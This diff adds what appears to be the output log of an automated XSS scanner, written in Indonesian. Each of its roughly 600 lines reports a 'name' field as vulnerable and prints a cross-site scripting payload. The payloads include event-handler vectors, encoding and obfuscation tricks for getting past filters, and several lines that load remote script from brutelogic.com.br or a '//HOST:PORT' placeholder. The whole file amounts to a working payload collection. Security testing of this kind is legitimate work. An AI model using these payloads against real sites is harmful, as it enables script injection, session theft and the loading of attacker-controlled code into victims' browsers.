@@ -1,0 +1,602 @@
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <script> alert("XSS") </script>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: "-prompt(8)-"
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: '-prompt(8)-'
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: ";a=prompt,a()//
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: ';a=prompt,a()//
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: '-eval("window['pro'%2B'mpt'](8)")-'
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: "-eval("window['pro'%2B'mpt'](8)")-"
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: "onclick=prompt(8)>"@x.y
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <image/src/onerror=prompt(8)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <img/src/onerror=prompt(8)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <image src/onerror=prompt(8)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <img src/onerror=prompt(8)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <image src =q onerror=prompt(8)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <img src =q onerror=prompt(8)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: </scrip</script>t><img src =q onerror=prompt(8)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <svg onload=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: "><svg onload=alert(1)//
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: "onmouseover=alert(1)//
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: "autofocus/onfocus=alert(1)//
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: '-alert(1)-'
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: '-alert(1)//
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: \'-alert(1)//
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: </script><svg onload=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x contenteditable onblur=alert(1)>lose focus! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x onclick=alert(1)>click this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x oncopy=alert(1)>copy this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x oncontextmenu=alert(1)>right click this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x oncut=alert(1)>copy this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x ondblclick=alert(1)>double click this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x ondrag=alert(1)>drag this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x contenteditable onfocus=alert(1)>focus this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x contenteditable oninput=alert(1)>input here! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x contenteditable onkeydown=alert(1)>press any key! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x contenteditable onkeypress=alert(1)>press any key! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x contenteditable onkeyup=alert(1)>press any key! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x onmousedown=alert(1)>click this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x onmousemove=alert(1)>hover this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x onmouseout=alert(1)>hover this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x onmouseover=alert(1)>hover this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x onmouseup=alert(1)>click this! 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x contenteditable onpaste=alert(1)>paste here!
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <script>alert(1)// 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <script>alert(1)<!–
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <script src=//brutelogic.com.br/1.js> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <script src=//3334957647/1>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: %3Cx onxxx=alert(1) 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <%78 onxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x %6Fnxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x o%6Exxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x on%78xx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x onxxx%3D1
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <X onxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x OnXxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <X OnXxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x onxxx=1 onxxx=1
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x/onxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x%09onxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x%0Aonxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x%0Conxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x%0Donxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x%2Fonxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x 1='1'onxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x 1="1"onxxx=1
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x </onxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x 1=">" onxxx=1 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <http://onxxx%3D1/
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <x onxxx=alert(1) 1='
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: 'onload=alert(1)><svg/1='
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: '>alert(1)</script><script/1=' 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: */alert(1)</script><script>/*
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: */alert(1)">'onload="/*<svg/1='
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: `-alert(1)">'onload="`<svg/1='
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: */</script>'>alert(1)/*<script/1='
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <script>alert(1)</script> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <script src=javascript:alert(1)> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <iframe src=javascript:alert(1)> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <embed src=javascript:alert(1)> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a href=javascript:alert(1)>click 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <math><brute href=javascript:alert(1)>click 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <form action=javascript:alert(1)><input type=submit> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <isindex action=javascript:alert(1) type=submit value=click> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <form><button formaction=javascript:alert(1)>click 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <form><input formaction=javascript:alert(1) type=submit value=click> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <form><input formaction=javascript:alert(1) type=image value=click> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <form><input formaction=javascript:alert(1) type=image src=SOURCE> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <isindex formaction=javascript:alert(1) type=submit value=click> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <object data=javascript:alert(1)> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <svg><script xlink:href=data:,alert(1) /> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <math><brute xlink:href=javascript:alert(1)>click 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <html ontouchstart=alert(1)> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <html ontouchend=alert(1)> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <html ontouchmove=alert(1)> 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <html ontouchcancel=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <body onorientationchange=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: "><img src=1 onerror=alert(1)>.gif
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <script src="data:&comma;alert(1)//
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: "><script src=data:&comma;alert(1)//
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <script src="//brutelogic.com.br&sol;1.js&num; 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: "><script src=//brutelogic.com.br&sol;1.js&num; 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; 
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: "><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base href=//0>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <body onload=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <body onpageshow=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <body onfocus=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <body onhashchange=alert(1)><a href=#x>click this!#x
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <body onscroll=alert(1)><br><br><br><br>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <br><br><br><br><br><br><br><br><br><br>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <br><br><br><br><br><br><br><br><br><br>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <br><br><br><br><br><br><x id=x>#x
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <body onresize=alert(1)>press F12!
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <body onhelp=alert(1)>press F1! (MSIE)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <marquee onstart=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <marquee loop=1 width=0 onfinish=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio src onloadstart=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <video onloadstart=alert(1)><source>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <input autofocus onblur=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <keygen autofocus onfocus=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <form onsubmit=alert(1)><input type=submit>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <select onchange=alert(1)><option>1<option>2
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <menu id=x contextmenu=x onshow=alert(1)>right click me!
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: alert`1`
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: alert&lpar;1&rpar;
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: alert&#x28;1&#x29
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: alert&#40;1&#41
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: (alert)(1)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: a=alert,a(1)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: [1].find(alert)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: top["al"+"ert"](1)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: top[/al/.source+/ert/.source](1)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: al\u0065rt(1)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: top['al\145rt'](1)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: top['al\x65rt'](1)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: top[8680439..toString(30)](1)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: navigator.vibrate(500)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: eval(URL.slice(-8))>#alert(1)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: eval(location.hash.slice(1)>#alert(1)
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: innerHTML=location.hash>#<script>alert(1)</script>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a draggable="true" ondrag="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a draggable="true" ondragend="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a draggable="true" ondragenter="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a draggable="true" ondragleave="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a draggable="true" ondragstart="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a id=x tabindex=1 onactivate=alert(1)></a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a id=x tabindex=1 onbeforeactivate=alert(1)></a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a id=x tabindex=1 onfocus=alert(1)></a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a id=x tabindex=1 onfocusin=alert(1)></a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onbeforecopy="alert(1)" contenteditable>test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onbeforecut="alert(1)" contenteditable>test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onbeforepaste="alert(1)" contenteditable>test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onclick="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a oncontextmenu="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a oncopy="alert(1)" contenteditable>test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a oncut="alert(1)" contenteditable>test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a ondblclick="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onkeydown="alert(1)" contenteditable>test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onkeypress="alert(1)" contenteditable>test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onkeyup="alert(1)" contenteditable>test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onmousedown="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onmouseenter="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onmouseleave="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onmousemove="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onmouseout="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onmouseover="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onmouseup="alert(1)">test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <a onpaste="alert(1)" contenteditable>test</a>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr draggable="true" ondrag="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr draggable="true" ondragend="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr draggable="true" ondragenter="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr draggable="true" ondragleave="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr draggable="true" ondragstart="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr id=x tabindex=1 onactivate=alert(1)></abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr id=x tabindex=1 onfocus=alert(1)></abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr id=x tabindex=1 onfocusin=alert(1)></abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onbeforecopy="alert(1)" contenteditable>test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onbeforecut="alert(1)" contenteditable>test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onbeforepaste="alert(1)" contenteditable>test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onclick="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr oncontextmenu="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr oncopy="alert(1)" contenteditable>test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr oncut="alert(1)" contenteditable>test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr ondblclick="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onkeydown="alert(1)" contenteditable>test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onkeypress="alert(1)" contenteditable>test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onkeyup="alert(1)" contenteditable>test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onmousedown="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onmouseenter="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onmouseleave="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onmousemove="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onmouseout="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onmouseover="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onmouseup="alert(1)">test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <abbr onpaste="alert(1)" contenteditable>test</abbr>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym draggable="true" ondrag="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym draggable="true" ondragend="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym draggable="true" ondragenter="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym draggable="true" ondragleave="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym draggable="true" ondragstart="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym id=x tabindex=1 onactivate=alert(1)></acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym id=x tabindex=1 onfocus=alert(1)></acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym id=x tabindex=1 onfocusin=alert(1)></acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onbeforecopy="alert(1)" contenteditable>test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onbeforecut="alert(1)" contenteditable>test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onbeforepaste="alert(1)" contenteditable>test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onclick="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym oncontextmenu="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym oncopy="alert(1)" contenteditable>test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym oncut="alert(1)" contenteditable>test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym ondblclick="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onkeydown="alert(1)" contenteditable>test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onkeypress="alert(1)" contenteditable>test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onkeyup="alert(1)" contenteditable>test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onmousedown="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onmouseenter="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onmouseleave="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onmousemove="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onmouseout="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onmouseover="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onmouseup="alert(1)">test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <acronym onpaste="alert(1)" contenteditable>test</acronym>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address draggable="true" ondrag="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address draggable="true" ondragend="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address draggable="true" ondragenter="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address draggable="true" ondragleave="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address draggable="true" ondragstart="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address id=x tabindex=1 onactivate=alert(1)></address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address id=x tabindex=1 onbeforeactivate=alert(1)></address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address id=x tabindex=1 onfocus=alert(1)></address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address id=x tabindex=1 onfocusin=alert(1)></address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onbeforecopy="alert(1)" contenteditable>test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onbeforecut="alert(1)" contenteditable>test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onbeforepaste="alert(1)" contenteditable>test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onblur=alert(1) tabindex=1 id=x></address><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onclick="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address oncontextmenu="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address oncopy="alert(1)" contenteditable>test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address oncut="alert(1)" contenteditable>test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address ondblclick="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onkeydown="alert(1)" contenteditable>test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onkeypress="alert(1)" contenteditable>test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onkeyup="alert(1)" contenteditable>test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onmousedown="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onmouseenter="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onmouseleave="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onmousemove="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onmouseout="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onmouseover="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onmouseup="alert(1)">test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <address onpaste="alert(1)" contenteditable>test</address>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet draggable="true" ondrag="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet draggable="true" ondragend="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet draggable="true" ondragenter="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet draggable="true" ondragleave="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet draggable="true" ondragstart="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet id=x tabindex=1 onactivate=alert(1)></applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet id=x tabindex=1 onfocus=alert(1)></applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet id=x tabindex=1 onfocusin=alert(1)></applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onbeforecopy="alert(1)" contenteditable>test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onbeforecut="alert(1)" contenteditable>test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onbeforepaste="alert(1)" contenteditable>test</applet>
